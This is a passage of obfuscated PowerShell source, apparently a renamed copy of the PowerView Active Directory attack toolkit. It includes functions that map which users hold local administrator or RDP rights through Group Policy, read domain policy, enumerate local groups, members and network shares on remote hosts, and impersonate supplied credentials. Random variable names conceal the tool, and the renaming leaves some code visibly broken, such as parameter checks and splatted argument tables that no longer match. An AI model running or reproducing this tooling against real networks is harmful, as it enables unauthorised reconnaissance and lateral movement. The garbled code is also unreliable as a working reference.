        elseif ($nZk3swW2LA -match 'Admin') {
            $wvcMxMPmfk3FImEm = 'S-1-5-32-544'
        }
        else {
            
            $wvcMxMPmfk3FImEm = 'S-1-5-32-555'
        }

        if ($wDz3XdUaQl[0] -ne '*') {
            ForEach ($iGUxNunanZGLKeqKM in $wDz3XdUaQl) {
                Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Enumerating nested group memberships for: '$iGUxNunanZGLKeqKM'"
                $wDz3XdUaQl += Get-DomainGroup @CommonArguments -UtHQ 'objectsid' -1qlU47 $iGUxNunanZGLKeqKM | Select-Object -ExpandProperty objectsid
            }
        }

        Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Target localgroup SID: $wvcMxMPmfk3FImEm"
        Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Effective target domain SIDs: $wDz3XdUaQl"

        $qCjSvKN4YExwbfPI5 = Get-DomainGPOLocalGroup @CommonArguments -Lqd4rhk7A | ForEach-Object {
            $pMQzc6jJ = $_
            
            if ($pMQzc6jJ.GroupSID -match $wvcMxMPmfk3FImEm) {
                $pMQzc6jJ.GroupMembers | Where-Object {$_} | ForEach-Object {
                    if ( ($wDz3XdUaQl[0] -eq '*') -or ($wDz3XdUaQl -Contains $_) ) {
                        $pMQzc6jJ
                    }
                }
            }
            
            if ( ($pMQzc6jJ.GroupMemberOf -contains $wvcMxMPmfk3FImEm) ) {
                if ( ($wDz3XdUaQl[0] -eq '*') -or ($wDz3XdUaQl -Contains $pMQzc6jJ.GroupSID) ) {
                    $pMQzc6jJ
                }
            }
        } | Sort-Object -Property GPOName -Unique

        $qCjSvKN4YExwbfPI5 | Where-Object {$_} | ForEach-Object {
            $El0sdi2IQySFWMBb5 = $_.GPODisplayName
            $kRGPVMgH0R = $_.GPOName
            $Azg9YOsfS = $_.GPOPath
            $edtHY2X2WU1WC4b8tVeHeWGr = $_.GPOType
            if ($_.GroupMembers) {
                $n6UMYQb3VC4u = $_.GroupMembers
            }
            else {
                $n6UMYQb3VC4u = $_.GroupSID
            }

            $yDokNOPMVgBJc1rKIsG9QpzSZ = $_.Filters

            if ($wDz3XdUaQl[0] -eq '*') {
                
                $f = $n6UMYQb3VC4u
            }
            else {
                $f = $lz
            }

            
            Get-DomainOU @CommonArguments -VcZPt -UtHQ 'name,distinguishedname' -qXx94 $kRGPVMgH0R | ForEach-Object {
                if ($yDokNOPMVgBJc1rKIsG9QpzSZ) {
                    $4oUYIYtILkQS3RP6t1vE = Get-DomainComputer @CommonArguments -UtHQ 'dnshostname,distinguishedname' -h2yNsAt $_.Path | Where-Object {$_.distinguishedname -match ($yDokNOPMVgBJc1rKIsG9QpzSZ.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    $4oUYIYtILkQS3RP6t1vE = Get-DomainComputer @CommonArguments -UtHQ 'dnshostname' -h2yNsAt $_.Path | Select-Object -ExpandProperty dnshostname
                }

                if ($4oUYIYtILkQS3RP6t1vE) {
                    if ($4oUYIYtILkQS3RP6t1vE -isnot [System.Array]) {$4oUYIYtILkQS3RP6t1vE = @($4oUYIYtILkQS3RP6t1vE)}

                    ForEach ($iGUxNunanZGLKeqKM in $f) {
                        $jp9jiurTsXvElqD = Get-DomainObject @CommonArguments -S $iGUxNunanZGLKeqKM -UtHQ 'samaccounttype,samaccountname,distinguishedname,objectsid'

                        $1dU1NobQpuQ9mPohYPAo7OGbY = @('268435456','268435457','536870912','536870913') -contains $jp9jiurTsXvElqD.samaccounttype

                        $BaYvrT = New-Object PSObject
                        $BaYvrT | Add-Member Noteproperty 'ObjectName' $jp9jiurTsXvElqD.samaccountname
                        $BaYvrT | Add-Member Noteproperty 'ObjectDN' $jp9jiurTsXvElqD.distinguishedname
                        $BaYvrT | Add-Member Noteproperty 'ObjectSID' $jp9jiurTsXvElqD.objectsid
                        $BaYvrT | Add-Member Noteproperty 'Domain' $3Ecdwi8qNy
                        $BaYvrT | Add-Member Noteproperty 'IsGroup' $1dU1NobQpuQ9mPohYPAo7OGbY
                        $BaYvrT | Add-Member Noteproperty 'GPODisplayName' $El0sdi2IQySFWMBb5
                        $BaYvrT | Add-Member Noteproperty 'GPOGuid' $kRGPVMgH0R
                        $BaYvrT | Add-Member Noteproperty 'GPOPath' $Azg9YOsfS
                        $BaYvrT | Add-Member Noteproperty 'GPOType' $edtHY2X2WU1WC4b8tVeHeWGr
                        $BaYvrT | Add-Member Noteproperty 'ContainerName' $_.Properties.distinguishedname
                        $BaYvrT | Add-Member Noteproperty 'ComputerName' $4oUYIYtILkQS3RP6t1vE
                        $BaYvrT.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
                        $BaYvrT
                    }
                }
            }

            
            Get-DomainSite @CommonArguments -UtHQ 'siteobjectbl,distinguishedname' -qXx94 $kRGPVMgH0R | ForEach-Object {
                ForEach ($iGUxNunanZGLKeqKM in $f) {
                    $jp9jiurTsXvElqD = Get-DomainObject @CommonArguments -S $iGUxNunanZGLKeqKM -UtHQ 'samaccounttype,samaccountname,distinguishedname,objectsid'

                    $1dU1NobQpuQ9mPohYPAo7OGbY = @('268435456','268435457','536870912','536870913') -contains $jp9jiurTsXvElqD.samaccounttype

                    $BaYvrT = New-Object PSObject
                    $BaYvrT | Add-Member Noteproperty 'ObjectName' $jp9jiurTsXvElqD.samaccountname
                    $BaYvrT | Add-Member Noteproperty 'ObjectDN' $jp9jiurTsXvElqD.distinguishedname
                    $BaYvrT | Add-Member Noteproperty 'ObjectSID' $jp9jiurTsXvElqD.objectsid
                    $BaYvrT | Add-Member Noteproperty 'IsGroup' $1dU1NobQpuQ9mPohYPAo7OGbY
                    $BaYvrT | Add-Member Noteproperty 'Domain' $3Ecdwi8qNy
                    $BaYvrT | Add-Member Noteproperty 'GPODisplayName' $El0sdi2IQySFWMBb5
                    $BaYvrT | Add-Member Noteproperty 'GPOGuid' $kRGPVMgH0R
                    $BaYvrT | Add-Member Noteproperty 'GPOPath' $Azg9YOsfS
                    $BaYvrT | Add-Member Noteproperty 'GPOType' $edtHY2X2WU1WC4b8tVeHeWGr
                    $BaYvrT | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                    $BaYvrT | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
                    $BaYvrT.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
                    $BaYvrT
                }
            }
        }
    }
}


function Get-DomainGPOComputerLocalGroupMapping {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $xrb91IXW,

        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $xUY,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $nZk3swW2LA = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $n5bZo = @{}
        if ($PSBoundParameters['Domain']) { $n5bZo['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Server']) { $n5bZo['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $n5bZo['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $n5bZo['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $n5bZo['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $n5bZo['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $n5bZo['Credential'] = $3ezVSfm6f4k }
    }

    PROCESS {
        if ($PSBoundParameters['ComputerIdentity']) {
            $QW = Get-DomainComputer @CommonArguments -S $xrb91IXW -UtHQ 'distinguishedname,dnshostname'

            if (-not $QW) {
                throw "[Get-DomainGPOComputerLocalGroupMapping] Computer $xrb91IXW not found. Try a fully qualified host name."
            }

            ForEach ($TfIJKo1L in $QW) {

                $s = @()

                
                $Is3MHqRhWXOH = $TfIJKo1L.distinguishedname
                $UQ = $Is3MHqRhWXOH.IndexOf('OU=')
                if ($UQ -gt 0) {
                    $1EOPi0HjdqGFZ = $Is3MHqRhWXOH.SubString($UQ)
                }
                if ($1EOPi0HjdqGFZ) {
                    $s += Get-DomainOU @CommonArguments -h2yNsAt $1EOPi0HjdqGFZ -c7rZO2V9 '(gplink=*)' | ForEach-Object {
                        Select-String -h92XtEowmqi $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }

                
                Write-Verbose "Enumerating the sitename for: $($TfIJKo1L.dnshostname)"
                $NnUfVdKjO5siuteHmb = (Get-NetComputerSiteName -mA $TfIJKo1L.dnshostname).SiteName
                if ($NnUfVdKjO5siuteHmb -and ($NnUfVdKjO5siuteHmb -notmatch 'Error')) {
                    $s += Get-DomainSite @CommonArguments -S $NnUfVdKjO5siuteHmb -c7rZO2V9 '(gplink=*)' | ForEach-Object {
                        Select-String -h92XtEowmqi $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }

                
                $s | Get-DomainGPOLocalGroup @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $pMQzc6jJ = $_

                    if($pMQzc6jJ.GroupMembers) {
                        $n6UMYQb3VC4u = $pMQzc6jJ.GroupMembers
                    }
                    else {
                        $n6UMYQb3VC4u = $pMQzc6jJ.GroupSID
                    }

                    $n6UMYQb3VC4u | ForEach-Object {
                        $jp9jiurTsXvElqD = Get-DomainObject @CommonArguments -S $_
                        $1dU1NobQpuQ9mPohYPAo7OGbY = @('268435456','268435457','536870912','536870913') -contains $jp9jiurTsXvElqD.samaccounttype

                        $nvYFKCrpmP9Iz3Rlw = New-Object PSObject
                        $nvYFKCrpmP9Iz3Rlw | Add-Member Noteproperty 'ComputerName' $TfIJKo1L.dnshostname
                        $nvYFKCrpmP9Iz3Rlw | Add-Member Noteproperty 'ObjectName' $jp9jiurTsXvElqD.samaccountname
                        $nvYFKCrpmP9Iz3Rlw | Add-Member Noteproperty 'ObjectDN' $jp9jiurTsXvElqD.distinguishedname
                        $nvYFKCrpmP9Iz3Rlw | Add-Member Noteproperty 'ObjectSID' $_
                        $nvYFKCrpmP9Iz3Rlw | Add-Member Noteproperty 'IsGroup' $1dU1NobQpuQ9mPohYPAo7OGbY
                        $nvYFKCrpmP9Iz3Rlw | Add-Member Noteproperty 'GPODisplayName' $pMQzc6jJ.GPODisplayName
                        $nvYFKCrpmP9Iz3Rlw | Add-Member Noteproperty 'GPOGuid' $pMQzc6jJ.GPOName
                        $nvYFKCrpmP9Iz3Rlw | Add-Member Noteproperty 'GPOPath' $pMQzc6jJ.GPOPath
                        $nvYFKCrpmP9Iz3Rlw | Add-Member Noteproperty 'GPOType' $pMQzc6jJ.GPOType
                        $nvYFKCrpmP9Iz3Rlw.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
                        $nvYFKCrpmP9Iz3Rlw
                    }
                }
            }
        }
    }
}


function Get-DomainPolicyData {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $NG9VMIl87F05 = 'Domain',

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $wtWPex5R = @{}
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }

        $HX6YyAJzhvK1VrW = @{}
        if ($PSBoundParameters['Server']) { $HX6YyAJzhvK1VrW['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['Credential']) { $HX6YyAJzhvK1VrW['Credential'] = $3ezVSfm6f4k }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $wtWPex5R['Domain'] = $3Ecdwi8qNy
            $HX6YyAJzhvK1VrW['Domain'] = $3Ecdwi8qNy
        }

        if ($NG9VMIl87F05 -eq 'All') {
            $wtWPex5R['Identity'] = '*'
        }
        elseif ($NG9VMIl87F05 -eq 'Domain') {
            $wtWPex5R['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif (($NG9VMIl87F05 -eq 'DomainController') -or ($NG9VMIl87F05 -eq 'DC')) {
            $wtWPex5R['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            $wtWPex5R['Identity'] = $NG9VMIl87F05
        }

        $1BL5clK = Get-DomainGPO @SearcherArguments

        ForEach ($XjTnEcjsPeGHlMl2pD in $1BL5clK) {
            
            $GptTmplPaths5KWSPKFJ6 = $XjTnEcjsPeGHlMl2pD.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            $W3mnpseP6XHSYCQ =  @{
                'GptTmplPath' = $GptTmplPaths5KWSPKFJ6
                'OutputObject' = $True
            }
            if ($PSBoundParameters['Credential']) { $W3mnpseP6XHSYCQ['Credential'] = $3ezVSfm6f4k }

            
            Get-GptTmpl @ParseArgs | ForEach-Object {
                $_ | Add-Member Noteproperty 'GPOName' $XjTnEcjsPeGHlMl2pD.name
                $_ | Add-Member Noteproperty 'GPODisplayName' $XjTnEcjsPeGHlMl2pD.displayname
                $_
            }
        }
    }
}










function Get-NetLocalGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mA = $8MSydlAwkKhVgnu4Ls10:COMPUTERNAME,

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $b07KAXTqvUWxSfk = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k
        }
    }

    PROCESS {
        ForEach ($TfIJKo1L in $mA) {
            if ($b07KAXTqvUWxSfk -eq 'API') {
                

                
                $U2xi7eoz5f0xgHEMni = 1
                $bmkq67sA3ALUu13wNpA7pV1 = [IntPtr]::Zero
                $EntriesReadlBz3e8lEw8sdMr8E1dYsS = 0
                $69F8qblRMGAcCGmjxKTWXouM = 0
                $iJWGI = 0

                
                $2KUDvV2HojTSzhMzNmslFPRL = $jmL9QM8qOyJ0k::NetLocalGroupEnum($TfIJKo1L, $U2xi7eoz5f0xgHEMni, [ref]$bmkq67sA3ALUu13wNpA7pV1, -1, [ref]$EntriesReadlBz3e8lEw8sdMr8E1dYsS, [ref]$69F8qblRMGAcCGmjxKTWXouM, [ref]$iJWGI)

                
                $2iCxJSbEZDQFphllc9F = $bmkq67sA3ALUu13wNpA7pV1.ToInt64()

                
                if (($2KUDvV2HojTSzhMzNmslFPRL -eq 0) -and ($2iCxJSbEZDQFphllc9F -gt 0)) {

                    
                    $kUONtubjrVMELIws = $okIWA07EPwqZK::GetSize()

                    
                    for ($RGKU3QpH = 0; ($RGKU3QpH -lt $EntriesReadlBz3e8lEw8sdMr8E1dYsS); $RGKU3QpH++) {
                        
                        $vKDIY5WdQizyLZ4rDCi = New-Object System.Intptr -ArgumentList $2iCxJSbEZDQFphllc9F
                        $vWCMTsyOgr08a = $vKDIY5WdQizyLZ4rDCi -as $okIWA07EPwqZK

                        $2iCxJSbEZDQFphllc9F = $vKDIY5WdQizyLZ4rDCi.ToInt64()
                        $2iCxJSbEZDQFphllc9F += $kUONtubjrVMELIws

                        $nZk3swW2LA = New-Object PSObject
                        $nZk3swW2LA | Add-Member Noteproperty 'ComputerName' $TfIJKo1L
                        $nZk3swW2LA | Add-Member Noteproperty 'GroupName' $vWCMTsyOgr08a.lgrpi1_name
                        $nZk3swW2LA | Add-Member Noteproperty 'Comment' $vWCMTsyOgr08a.lgrpi1_comment
                        $nZk3swW2LA.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                        $nZk3swW2LA
                    }
                    
                    $qYFR5PCZruUkdna9T = $jmL9QM8qOyJ0k::NetApiBufferFree($bmkq67sA3ALUu13wNpA7pV1)
                }
                else {
                    Write-Verbose "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $2KUDvV2HojTSzhMzNmslFPRL).Message)"
                }
            }
            else {
                
                $e01d = [ADSI]"WinNT://$TfIJKo1L,computer"

                $e01d.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                    $nZk3swW2LA = ([ADSI]$_)
                    $BOr2NcFYpLPWHjdn8TXZQ4 = New-Object PSObject
                    $BOr2NcFYpLPWHjdn8TXZQ4 | Add-Member Noteproperty 'ComputerName' $TfIJKo1L
                    $BOr2NcFYpLPWHjdn8TXZQ4 | Add-Member Noteproperty 'GroupName' ($nZk3swW2LA.InvokeGet('Name'))
                    $BOr2NcFYpLPWHjdn8TXZQ4 | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($nZk3swW2LA.InvokeGet('objectsid'),0)).Value)
                    $BOr2NcFYpLPWHjdn8TXZQ4 | Add-Member Noteproperty 'Comment' ($nZk3swW2LA.InvokeGet('Description'))
                    $BOr2NcFYpLPWHjdn8TXZQ4.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                    $BOr2NcFYpLPWHjdn8TXZQ4
                }
            }
        }
    }
    
    END {
        if ($QWX1OeqTMV876JyRF) {
            Invoke-RevertToSelf -5 $QWX1OeqTMV876JyRF
        }
    }
}


function Get-NetLocalGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mA = $8MSydlAwkKhVgnu4Ls10:COMPUTERNAME,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $YePFivOGqr = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $b07KAXTqvUWxSfk = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k
        }
    }

    PROCESS {
        ForEach ($TfIJKo1L in $mA) {
            if ($b07KAXTqvUWxSfk -eq 'API') {
                

                
                $U2xi7eoz5f0xgHEMni = 2
                $bmkq67sA3ALUu13wNpA7pV1 = [IntPtr]::Zero
                $EntriesReadlBz3e8lEw8sdMr8E1dYsS = 0
                $69F8qblRMGAcCGmjxKTWXouM = 0
                $iJWGI = 0

                
                $2KUDvV2HojTSzhMzNmslFPRL = $jmL9QM8qOyJ0k::NetLocalGroupGetMembers($TfIJKo1L, $YePFivOGqr, $U2xi7eoz5f0xgHEMni, [ref]$bmkq67sA3ALUu13wNpA7pV1, -1, [ref]$EntriesReadlBz3e8lEw8sdMr8E1dYsS, [ref]$69F8qblRMGAcCGmjxKTWXouM, [ref]$iJWGI)

                
                $2iCxJSbEZDQFphllc9F = $bmkq67sA3ALUu13wNpA7pV1.ToInt64()

                $vLpXxy5J8BVMX8VjUelZ = @()

                
                if (($2KUDvV2HojTSzhMzNmslFPRL -eq 0) -and ($2iCxJSbEZDQFphllc9F -gt 0)) {

                    
                    $kUONtubjrVMELIws = $K9eMnZdEG::GetSize()

                    
                    for ($RGKU3QpH = 0; ($RGKU3QpH -lt $EntriesReadlBz3e8lEw8sdMr8E1dYsS); $RGKU3QpH++) {
                        
                        $vKDIY5WdQizyLZ4rDCi = New-Object System.Intptr -ArgumentList $2iCxJSbEZDQFphllc9F
                        $vWCMTsyOgr08a = $vKDIY5WdQizyLZ4rDCi -as $K9eMnZdEG

                        $2iCxJSbEZDQFphllc9F = $vKDIY5WdQizyLZ4rDCi.ToInt64()
                        $2iCxJSbEZDQFphllc9F += $kUONtubjrVMELIws

                        $TICkroQVYfm = ''
                        $Result2ubL6QWXkXvEbOeWOEk = $b8ZFNi9uGrz0TyhMxtc2s3R5Q::ConvertSidToStringSid($vWCMTsyOgr08a.lgrmi2_sid, [ref]$TICkroQVYfm);$ZPR8SXJ1J = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result2ubL6QWXkXvEbOeWOEk -eq 0) {
                            Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $ZPR8SXJ1J).Message)"
                        }
                        else {
                            $jno = New-Object PSObject
                            $jno | Add-Member Noteproperty 'ComputerName' $TfIJKo1L
                            $jno | Add-Member Noteproperty 'GroupName' $YePFivOGqr
                            $jno | Add-Member Noteproperty 'MemberName' $vWCMTsyOgr08a.lgrmi2_domainandname
                            $jno | Add-Member Noteproperty 'SID' $TICkroQVYfm
                            $1dU1NobQpuQ9mPohYPAo7OGbY = $($vWCMTsyOgr08a.lgrmi2_sidusage -eq 'SidTypeGroup')
                            $jno | Add-Member Noteproperty 'IsGroup' $1dU1NobQpuQ9mPohYPAo7OGbY
                            $jno.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                            $vLpXxy5J8BVMX8VjUelZ += $jno
                        }
                    }

                    
                    $qYFR5PCZruUkdna9T = $jmL9QM8qOyJ0k::NetApiBufferFree($bmkq67sA3ALUu13wNpA7pV1)

                    
                    $dkRu05I = $vLpXxy5J8BVMX8VjUelZ | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
                    if ($dkRu05I) {
                        $dkRu05I = $dkRu05I.Substring(0, $dkRu05I.LastIndexOf('-'))

                        $vLpXxy5J8BVMX8VjUelZ | ForEach-Object {
                            if ($_.SID -match $dkRu05I) {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' $True
                            }
                        }
                    }
                    else {
                        $vLpXxy5J8BVMX8VjUelZ | ForEach-Object {
                            if ($_.SID -notmatch 'S-1-5-21') {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' 'UNKNOWN'
                            }
                        }
                    }
                    $vLpXxy5J8BVMX8VjUelZ
                }
                else {
                    Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $2KUDvV2HojTSzhMzNmslFPRL).Message)"
                }
            }
            else {
                
                try {
                    $2LwAL8 = [ADSI]"WinNT://$TfIJKo1L/$YePFivOGqr,group"

                    $2LwAL8.psbase.Invoke('Members') | ForEach-Object {

                        $jno = New-Object PSObject
                        $jno | Add-Member Noteproperty 'ComputerName' $TfIJKo1L
                        $jno | Add-Member Noteproperty 'GroupName' $YePFivOGqr

                        $2S41 = ([ADSI]$_)
                        $09JqhbOMT52 = $2S41.InvokeGet('AdsPath').Replace('WinNT://', '')
                        $1dU1NobQpuQ9mPohYPAo7OGbY = ($2S41.SchemaClassName -like 'group')

                        if(([regex]::Matches($09JqhbOMT52, '/')).count -eq 1) {
                            
                            $lioIqrY8tJ = $True
                            $TwsV1 = $09JqhbOMT52.Replace('/', '\')
                        }
                        else {
                            
                            $lioIqrY8tJ = $False
                            $TwsV1 = $09JqhbOMT52.Substring($09JqhbOMT52.IndexOf('/')+1).Replace('/', '\')
                        }

                        $jno | Add-Member Noteproperty 'AccountName' $TwsV1
                        $jno | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($2S41.InvokeGet('ObjectSID'),0)).Value)
                        $jno | Add-Member Noteproperty 'IsGroup' $1dU1NobQpuQ9mPohYPAo7OGbY
                        $jno | Add-Member Noteproperty 'IsDomain' $lioIqrY8tJ

                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        $jno
                    }
                }
                catch {
                    Write-Verbose "[Get-NetLocalGroupMember] Error for $TfIJKo1L : $_"
                }
            }
        }
    }
    
    END {
        if ($QWX1OeqTMV876JyRF) {
            Invoke-RevertToSelf -5 $QWX1OeqTMV876JyRF
        }
    }
}


function Get-NetShare {


    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mA = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k
        }
    }

    PROCESS {
        ForEach ($TfIJKo1L in $mA) {
            
            $U2xi7eoz5f0xgHEMni = 1
            $bmkq67sA3ALUu13wNpA7pV1 = [IntPtr]::Zero
            $EntriesReadlBz3e8lEw8sdMr8E1dYsS = 0
            $69F8qblRMGAcCGmjxKTWXouM = 0
            $iJWGI = 0

            
            $2KUDvV2HojTSzhMzNmslFPRL = $jmL9QM8qOyJ0k::NetShareEnum($TfIJKo1L, $U2xi7eoz5f0xgHEMni, [ref]$bmkq67sA3ALUu13wNpA7pV1, -1, [ref]$EntriesReadlBz3e8lEw8sdMr8E1dYsS, [ref]$69F8qblRMGAcCGmjxKTWXouM, [ref]$iJWGI)

            
            $2iCxJSbEZDQFphllc9F = $bmkq67sA3ALUu13wNpA7pV1.ToInt64()

            
            if (($2KUDvV2HojTSzhMzNmslFPRL -eq 0) -and ($2iCxJSbEZDQFphllc9F -gt 0)) {

                
                $kUONtubjrVMELIws = $G4fcROZ::GetSize()

                
                for ($RGKU3QpH = 0; ($RGKU3QpH -lt $EntriesReadlBz3e8lEw8sdMr8E1dYsS); $RGKU3QpH++) {
                    
                    $vKDIY5WdQizyLZ4rDCi = New-Object System.Intptr -ArgumentList $2iCxJSbEZDQFphllc9F
                    $vWCMTsyOgr08a = $vKDIY5WdQizyLZ4rDCi -as $G4fcROZ

                    
                    $ZSBS6 = $vWCMTsyOgr08a | Select-Object *
                    $ZSBS6 | Add-Member Noteproperty 'ComputerName' $TfIJKo1L
                    $ZSBS6.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                    $2iCxJSbEZDQFphllc9F = $vKDIY5WdQizyLZ4rDCi.ToInt64()
                    $2iCxJSbEZDQFphllc9F += $kUONtubjrVMELIws
                    $ZSBS6
                }

                
                $qYFR5PCZruUkdna9T = $jmL9QM8qOyJ0k::NetApiBufferFree($bmkq67sA3ALUu13wNpA7pV1)
            }
            else {
